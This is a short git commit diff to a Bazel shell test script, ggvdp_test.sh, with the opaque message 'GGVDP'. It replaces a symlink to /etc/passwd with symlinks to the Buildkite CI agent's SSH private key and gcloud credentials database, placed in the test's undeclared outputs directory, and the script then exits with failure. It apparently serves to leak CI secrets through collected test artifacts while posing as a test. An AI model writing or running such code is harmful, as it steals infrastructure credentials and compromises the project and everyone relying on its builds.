dc418d85305741e971951ba437c24a7e090969cc
chupaohong <chupaohong@MacBook-Pro.local>
2026-03-30 14:12:29 +0700

    GGVDP

--- src/test/shell/bazel/ggvdp_test.sh
+++ src/test/shell/bazel/ggvdp_test.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
-ln -s /etc/passwd "$TEST_UNDECLARED_OUTPUTS_DIR/passwd"
+ln -s /var/lib/buildkite-agent/.ssh/id_ed25519 "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_key"
+ln -s /var/lib/buildkite-agent/.config/gcloud/credentials.db "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_creds"
 exit 1
